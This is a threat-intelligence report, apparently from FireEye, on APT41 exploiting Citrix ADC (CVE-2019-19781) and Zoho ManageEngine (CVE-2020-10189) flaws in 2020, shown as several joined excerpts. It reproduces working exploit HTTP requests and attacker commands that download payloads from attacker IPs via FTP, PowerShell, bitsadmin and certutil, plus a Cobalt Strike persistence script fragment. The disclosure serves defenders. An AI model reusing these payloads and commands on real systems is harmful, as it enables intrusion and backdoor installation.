Countries we’ve seen targeted include Australia, Canada, Denmark, Finland, France, India, Italy,\nJapan, Malaysia, Mexico, Philippines, Poland, Qatar, Saudi Arabia, Singapore, Sweden, Switzerland, UAE, UK and USA.\nThe following industries were targeted: Banking/Finance, Construction, Defense Industrial Base, Government,\nHealthcare, High Technology, Higher Education, Legal, Manufacturing, Media, Non-profit, Oil & Gas, Petrochemical,\nPharmaceutical, Real Estate, Telecommunications, Transportation, Travel, and Utility. It’s unclear if APT41 scanned the\nInternet and attempted exploitation en masse or selected a subset of specific organizations to target, but the victims\nappear to be more targeted in nature.\n\n**Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])**\n\nStarting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery\n[Controller (ADC) and Citrix Gateway devices with CVE-2019-19781 (published December 17, 2019).](https://support.citrix.com/article/CTX267027)\n\n\n-----\n\nTimeline of key events\n\n\nFigure 1: Timeline of key events\n\nThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the\ncommand ‘file /bin/pwd’, which may have achieved two objectives for APT41. First, it would confirm whether the system\n[was vulnerable and the mitigation wasn’t applied. Second, it may return architecture-related information that would be](https://support.citrix.com/article/CTX267679)\nrequired knowledge for APT41 to successfully deploy a backdoor in a follow-up step.\n\nOne interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41\nwas operating with an already-known list of identified devices accessible on the internet.\n\nPOST /vpns/portal/scripts/newbm.pl HTTP/1.1\nHost: [redacted]\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nUser-Agent: python-requests/2.22.0\nNSC_NONCE: nsroot\nNSC_USER: ../../../netscaler/portal/templates/[redacted]\nContent-Length: 96\n\nurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]\n\nFigure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nThere is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New\nYear holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by\nChinese APT groups in past years as well.\n\n\n-----\n\nStarting on February 1, 2020, APT41 moved to using CVE 2019 19781 exploit payloads that initiate a download via the\nFile Transfer Protocol (FTP). Specifically, APT41 executed the command ‘/usr/bin/ftp -o /tmp/bsd ftp://test:\n\n[redacted]\\@66.42.98[.]220/bsd’, which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server\nwith a username of ‘test’ and a password that we have redacted, and then downloaded an unknown payload named ‘bsd’\n(which was likely a backdoor).\n\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\nAccept-Encoding: identity\nContent-Length: 147\nConnection: close\nNsc_User: ../../../netscaler/portal/templates/[redacted]\nUser-Agent: Python-urllib/2.7\nNsc_Nonce: nsroot\nHost: [redacted]\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test:\n\n**[redacted]\\@66.42.98[.]220/bsd`') %]**\n\nFigure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781\n\nWe did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated\nCOVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out\nquarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction\nin activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other\nways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781\nexploitation on February 24 and February 25.

Beginning on March 8, FireEye observed APT41 use 91.208.184[.]78 to attempt to exploit the Zoho\nManageEngine vulnerability at more than a dozen FireEye customers, which resulted in the compromise of at least five\nseparate customers. FireEye observed two separate variations of how the payloads (install.bat and storesyncsvc.dll)\nwere deployed. In the first variation the CVE-2020-10189 exploit was used to directly upload “logger.zip”, a simple Java\nbased program, which contained a set of commands to use PowerShell to download and execute install.bat and\nstoresyncsvc.dll.\n\njava/lang/Runtime\n\ngetRuntime\n\n()Ljava/lang/Runtime;\n\nXcmd /c powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\\n\nWindows\\Temp\\install.bat')&powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','\n\nC:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat\n\n'(Ljava/lang/String;)Ljava/lang/Process;\n\nStackMapTable\n\nysoserial/Pwner76328858520609\n\nLysoserial/Pwner76328858520609;\n\nFigure 6: Contents of logger.zip\n\n[Here we see a toolmark from the tool ysoserial that was used to create the payload in the POC. The string](https://github.com/frohoff/ysoserial)\nPwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in\ntheir operation.\n\nIn the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download\ninstall.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.\n\nParent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe\n\nProcess Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat\nC:\\Users\\Public\\install.bat\n\n\n-----\n\nFigure 7: Example FireEye Endpoint Security event depicting successful CVE 2020 10189 exploitation\n\nIn both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON\nloader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).\n\n@echo off\n\nset \"WORK_DIR=C:\\Windows\\System32\"\n\nset \"DLL_NAME=storesyncsvc.dll\"\n\nset \"SERVICE_NAME=StorSyncSvc\"\n\nset \"DISPLAY_NAME=Storage Sync Service\"\n\nset \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync.

The file 2.exe was a\nVMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected\nbinaries is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay\nanalysis of other tools in their toolkit.\n\nGET /2.exe HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nUser-Agent: Microsoft-CryptoAPI/6.3\nHost: 91.208.184[.]78\n\nFigure 10: Example HTTP request downloading ‘2.exe’ VMProtected Meterpreter downloader via CertUtil\n\ncertutil -urlcache -split -f http://91.208.184[.]78/2.exe\n\nFigure 11: Example CertUtil command to download ‘2.exe’ VMProtected Meterpreter downloader\n\nThe Meterpreter downloader ‘TzGG’ was configured to communicate with 91.208.184[.]78 over port 443 to download the\nshellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).\n\nGET /TzGG HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)\nHost: 91.208.184[.]78:443\nConnection: Keep-Alive\nCache-Control: no-cache\n\nFigure 12: Example HTTP request downloading ‘TzGG’ shellcode for Cobalt Strike BEACON\n\nThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78.

While these backdoors are full featured, in previous incidents APT41 has waited to deploy more\nadvanced malware until they have fully understood where they were and carried out some initial reconnaissance. In\n2020, APT41 continues to be one of the most prolific threats that FireEye currently tracks. This new activity from this\ngroup shows how resourceful and how quickly they can leverage newly disclosed vulnerabilities to their advantage.\n\nPreviously, [FireEye Mandiant Managed Defense identified APT41 successfully leverage CVE-2019-3396 (Atlassian](https://www.fireeye.com/solutions/managed-solutions/managed-defense)\nConfluence) against a U.S. based university.
